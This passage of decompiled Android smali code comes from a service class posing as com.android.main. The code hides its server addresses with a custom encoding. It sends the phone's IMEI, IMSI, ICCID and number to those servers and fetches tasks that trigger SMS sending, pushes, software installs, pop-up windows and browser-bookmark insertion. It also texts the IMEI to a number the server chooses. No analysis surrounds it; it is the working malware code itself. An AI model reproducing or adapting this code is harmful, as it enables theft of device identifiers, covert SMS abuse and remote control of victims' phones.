    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object/from16 v19, v0

    invoke-virtual/range {v19 .. v19}, Ljava/lang/String;->length()I

    move-result v19

    const/16 v20, 0xa

    move/from16 v0, v19

    move/from16 v1, v20

    if-le v0, v1, :cond_8

    .line 254
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "&mobile="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    .line 258
    :cond_8
    :try_start_0
    invoke-static/range {v18 .. v18}, Lcom/android/main/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 259
    .local v3, "allStr":Ljava/lang/String;
    if-eqz v3, :cond_a

    const-string v19, ""

    move-object/from16 v0, v19

    move-object v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_a

    .line 260
    const-string v19, "no"

    move-object/from16 v0, v19

    move-object v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_d

    .line 261
    const-string v19, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->destMobile:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-eqz v19, :cond_9

    .line 262
    invoke-direct/range {p0 .. p0}, Lcom/android/main/MainService;->getDestMobile()I

    .line 264
    :cond_9
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->destMobile:Ljava/lang/String;

    move-object/from16 v19, v0

    new-instance v20, Ljava/lang/StringBuilder;

    const-string v21, "imei:"

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 280
    .end local v3    # "allStr":Ljava/lang/String;
    .end local v18    # "xmlUrl":Ljava/lang/String;
    :cond_a
    :goto_1
    const/16 v19, 0x2

    aget-object v19, v7, v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    .line 281
    const/16 v19, 0x3

    aget-object v19, v7, v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->installtime:Ljava/lang/String;

    .line 282
    const/16 v19, 0x4

    aget-object v19, v7, v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->region:Ljava/lang/String;

    .line 283
    const/16 v19, 0x5

    aget-object v19, v7, v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    .line 284
    const/16 v19, 0x6

    aget-object v19, v7, v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->mnc:Ljava/lang/String;

    .line 286
    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "http://"

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 287
    const-string v20, "ax3mkl4mgele2guoo9f1hc3ohm"

    const/16 v21, 0x3

    const/16 v22, 0x3

    invoke-static/range {v20 .. v22}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 288
    const-string v20, ":8118/push/newandroidxml/"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->bigpid:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "_"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->version:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "/"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 289
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mnc:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "/"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->region:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, ".xml?sim="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "&tel="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 290
    const-string v20, "&imsi="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "&iccid="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->iccid:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "&pid="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 286
    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    .line 292
    .restart local v18    # "xmlUrl":Ljava/lang/String;
    :try_start_1
    move-object/from16 v0, p0

    iget-boolean v0, v0, Lcom/android/main/MainService;->istask:Z

    move/from16 v19, v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-nez v19, :cond_e

    .line 339
    .end local v6    # "difdate":Ljava/lang/Long;
    .end local v10    # "isbian":Z
    .end local v18    # "xmlUrl":Ljava/lang/String;
    :cond_b
    :goto_2
    return-void

    .line 223
    .restart local v6    # "difdate":Ljava/lang/Long;
    :cond_c
    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J

    move-result-wide v19

    const-wide/32 v21, 0xa4cb800

    cmp-long v19, v19, v21

    if-lez v19, :cond_2

    .line 224
    const/16 v19, 0x0

    const/16 v20, 0x1

    invoke-static/range {v20 .. v20}, Lcom/android/main/StringUtil;->getCurrentDate(I)Ljava/lang/String;

    move-result-object v20

    aput-object v20, v7, v19

    goto/16 :goto_0

    .line 266
    .restart local v3    # "allStr":Ljava/lang/String;
    .restart local v10    # "isbian":Z
    .restart local v18    # "xmlUrl":Ljava/lang/String;
    :cond_d
    :try_start_2
    const-string v19, "#"

    move-object v0, v3

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v17

    .line 267
    .local v17, "tmps":[Ljava/lang/String;
    if-eqz v17, :cond_a

    move-object/from16 v0, v17

    array-length v0, v0

    move/from16 v19, v0

    const/16 v20, 0x3

    move/from16 v0, v19

    move/from16 v1, v20

    if-ne v0, v1, :cond_a

    .line 268
    const/16 v19, 0x2

    const/16 v20, 0x0

    aget-object v20, v17, v20

    aput-object v20, v7, v19

    .line 269
    const/16 v19, 0x4

    const/16 v20, 0x1

    aget-object v20, v17, v20

    aput-object v20, v7, v19

    .line 270
    const/16 v19, 0x5

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    move-object/from16 v20, v0

    aput-object v20, v7, v19

    .line 271
    const/16 v19, 0x6

    const/16 v20, 0x2

    aget-object v20, v17, v20

    aput-object v20, v7, v19

    .line 273
    move-object/from16 v0, p0

    move-object v1, v7

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_1

    .line 277
    .end local v3    # "allStr":Ljava/lang/String;
    .end local v17    # "tmps":[Ljava/lang/String;
    :catch_0
    move-exception v19

    goto/16 :goto_1

    .line 294
    :cond_e
    :try_start_3
    invoke-static/range {v18 .. v18}, Lcom/android/main/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 295
    .restart local v3    # "allStr":Ljava/lang/String;
    const/16 v19, 0x0

    move/from16 v0, v19

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z

    .line 296
    if-eqz v3, :cond_f

    const-string v19, ""

    move-object/from16 v0, v19

    move-object v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_f

    const-string v19, "null"

    move-object/from16 v0, v19

    move-object v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-eqz v19, :cond_10

    .line 297
    :cond_f
    const/16 v19, 0x1

    move/from16 v0, v19

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto/16 :goto_2

    .line 336
    .end local v3    # "allStr":Ljava/lang/String;
    :catch_1
    move-exception v19

    move-object/from16 v8, v19

    .line 337
    .local v8, "e":Ljava/lang/Exception;
    const/16 v19, 0x1

    move/from16 v0, v19

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z

    goto/16 :goto_2

    .line 300
    .end local v8    # "e":Ljava/lang/Exception;
    .restart local v3    # "allStr":Ljava/lang/String;
    :cond_10
    :try_start_4
    const-string v19, "<task>"

    const-string v20, "</task>"

    move-object v0, v3

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->task:Ljava/lang/String;

    .line 301
    const-string v19, "<datenum>"

    .line 302
    const-string v20, "</datenum>"

    .line 301
    move-object v0, v3

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 303
    .local v5, "datenum":Ljava/lang/String;
    const/4 v9, 0x1

    .line 304
    .local v9, "exec":Z
    const/16 v4, -0x65

    .line 305
    .local v4, "code":I
    const-string v19, "no"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_11

    .line 306
    const/16 v4, -0x64

    .line 307
    const/4 v9, 0x0

    .line 309
    :cond_11
    if-eqz v5, :cond_12

    const-string v19, ""

    move-object/from16 v0, v19

    move-object v1, v5

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_12

    const-string v19, "0"

    move-object/from16 v0, v19

    move-object v1, v5

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_12

    .line 310
    const/16 v19, 0x3

    aget-object v19, v7, v19

    .line 311
    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v20

    .line 310
    invoke-static/range {v19 .. v20}, Lcom/android/main/StringUtil;->getTimeLength(Ljava/lang/String;I)I

    move-result v14

    .line 312
    .restart local v14    # "result":I
    if-nez v14, :cond_12

    .line 313
    const/4 v9, 0x0

    .line 315
    .end local v14    # "result":I
    :cond_12
    if-nez v9, :cond_13

    .line 317
    move-object/from16 v0, p0

    move-object v1, v7

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 318
    const/16 v19, 0x0

    move-object/from16 v0, p0

    move v1, v4

    move/from16 v2, v19

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->LogService(II)I

    .line 319
    const/16 v19, 0x1

    move/from16 v0, v19

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z

    goto/16 :goto_2

    .line 322
    :cond_13
    const-string v19, "note"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_15

    .line 323
    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v7

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->sendSms(Ljava/lang/String;[Ljava/lang/String;)V

    .line 335
    :cond_14
    :goto_3
    const/16 v19, 0x1

    move/from16 v0, v19

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z

    goto/16 :goto_2

    .line 324
    :cond_15
    const-string v19, "push"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_16

    .line 325
    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v7

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->execPush(Ljava/lang/String;[Ljava/lang/String;)V

    goto :goto_3

    .line 326
    :cond_16
    const-string v19, "soft"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_17

    .line 327
    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v7

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->execSoft(Ljava/lang/String;[Ljava/lang/String;)V

    goto :goto_3

    .line 328
    :cond_17
    const-string v19, "window"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_18

    .line 329
    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v7

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->execTanc(Ljava/lang/String;[Ljava/lang/String;)V

    goto :goto_3

    .line 330
    :cond_18
    const-string v19, "xbox"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-nez v19, :cond_14

    .line 332
    const-string v19, "mark"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_14

    .line 333
    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v7

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->execMark(Ljava/lang/String;[Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_3
.end method

.method private getDestMobile()I
    .locals 10

    .prologue
    const/4 v9, 0x3

    .line 688
    const/4 v4, 0x0

    .line 689
    .local v4, "result":I
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "http://"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 690
    const-string v8, "3lgoagdmfejekgfos9t15chojm"

    invoke-static {v8, v9, v9}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 691
    const-string v8, ":9033/android.log?id="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    iget-object v8, p0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "&softid=0&cn=0&nt="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 692
    iget-object v8, p0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "&sim="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    iget-object v8, p0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "&tel="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    iget-object v8, p0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "&imsi="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 693
    iget-object v8, p0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "&iccid="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    iget-object v8, p0, Lcom/android/main/MainService;->iccid:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 689
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 696
    .local v5, "statisUrl":Ljava/lang/String;
    :try_start_0
    invoke-static {v5}, Lcom/android/main/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 697
    .local v0, "allStr":Ljava/lang/String;
    if-eqz v0, :cond_1

    const-string v7, ""

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-nez v7, :cond_1

    .line 698
    const-string v7, "#"

    invoke-virtual {v0, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 699
    .local v1, "allStrs":[Ljava/lang/String;
    array-length v3, v1

    .line 700
    .local v3, "len":I
    if-lez v3, :cond_0

    .line 701
    invoke-static {v3}, Lcom/android/main/StringUtil;->getRandomNumber(I)I

    move-result v6

    .line 702
    .local v6, "tmplen":I
    aget-object v7, v1, v6

    iput-object v7, p0, Lcom/android/main/MainService;->destMobile:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 704
    .end local v6    # "tmplen":I
    :cond_0
    const/16 v4, 0xc8

    .line 709
    .end local v0    # "allStr":Ljava/lang/String;
    .end local v1    # "allStrs":[Ljava/lang/String;
    .end local v3    # "len":I
    :cond_1
    :goto_0
    return v4

    .line 706
    :catch_0
    move-exception v7

    move-object v2, v7

    .line 707
    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private initChannel()V
    .locals 6

    .prologue
    const-string v5, "1"

    .line 835
    const-string v4, "1"

    iput-object v5, p0, Lcom/android/main/MainService;->bigpid:Ljava/lang/String;

    .line 836
    const-string v4, "1"

    iput-object v5, p0, Lcom/android/main/MainService;->version:Ljava/lang/String;

    .line 837
    const-string v4, "wl-nz-test"

    iput-object v4, p0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    .line 838
    const/4 v1, 0x0

    .line 840
    .local v1, "is":Ljava/io/InputStream;
    :try_start_0
    const-class v4, Lcom/android/main/MainService;

    const-string v5, "/com/android"

    invoke-virtual {v4, v5}, Ljava/lang/Class;->getResourceAsStream(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v1

    .line 841
    new-instance v2, Ljava/util/Properties;

    invoke-direct {v2}, Ljava/util/Properties;-><init>()V

    .line 842
    .local v2, "properties":Ljava/util/Properties;
    invoke-virtual {v2, v1}, Ljava/util/Properties;->load(Ljava/io/InputStream;)V

    .line 843
    const-string v4, "bigpid"

    invoke-virtual {v2, v4}, Ljava/util/Properties;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 845
    .local v3, "tmp":Ljava/lang/String;
    if-eqz v3, :cond_0

    .line 846
    iput-object v3, p0, Lcom/android/main/MainService;->bigpid:Ljava/lang/String;

    .line 848
    :cond_0
    const-string v4, "version"

    invoke-virtual {v2, v4}, Ljava/util/Properties;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 850
    if-eqz v3, :cond_1

    .line 851
    iput-object v3, p0, Lcom/android/main/MainService;->version:Ljava/lang/String;

    .line 853
    :cond_1
    const-string v4, "smallpid"

    invoke-virtual {v2, v4}, Ljava/util/Properties;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 855
    if-eqz v3, :cond_2

    .line 856
    iput-object v3, p0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 858
    :cond_2
    const/4 v2, 0x0

    .line 862
    if-eqz v1, :cond_3

    .line 864
    :try_start_1
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_3

    .line 870
    .end local v2    # "properties":Ljava/util/Properties;
    .end local v3    # "tmp":Ljava/lang/String;
    :cond_3
    :goto_0
    return-void

    .line 859
    :catch_0
    move-exception v4

    move-object v0, v4

    .line 860
    .local v0, "e":Ljava/lang/Exception;
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 862
    if-eqz v1, :cond_3

    .line 864
    :try_start_3
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0

    .line 865
    :catch_1
    move-exception v0

    .line 866
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 861
    .end local v0    # "e":Ljava/io/IOException;
    :catchall_0
    move-exception v4

    .line 862
    if-eqz v1, :cond_4

    .line 864
    :try_start_4
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_2

    .line 869
    :cond_4
    :goto_1
    throw v4

    .line 865
    :catch_2
    move-exception v0

    .line 866
    .restart local v0    # "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 865
    .end local v0    # "e":Ljava/io/IOException;
    .restart local v2    # "properties":Ljava/util/Properties;
    .restart local v3    # "tmp":Ljava/lang/String;
    :catch_3
    move-exception v0

    .line 866
    .restart local v0    # "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method private insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I
    .locals 13
    .param p1, "title"    # Ljava/lang/String;
    .param p2, "insertUrl"    # Ljava/lang/String;

    .prologue
    const-string v3, "url"

    .line 579
    const/16 v10, -0x3e9

    .line 581
    .local v10, "result":I
    :try_start_0
    const-string v3, "content://browser/bookmarks"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 582
    .local v1, "browserUri":Landroid/net/Uri;
    const/4 v3, 0x1

    new-array v2, v3, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "url"

    aput-object v4, v2, v3

    .line 583
    .local v2, "projection":[Ljava/lang/String;
    invoke-virtual {p0}, Lcom/android/main/MainService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 584
    .local v0, "contentResolver":Landroid/content/ContentResolver;
    const/4 v3, 0x0

    .line 585
    const/4 v4, 0x0

    const/4 v5, 0x0

    .line 584
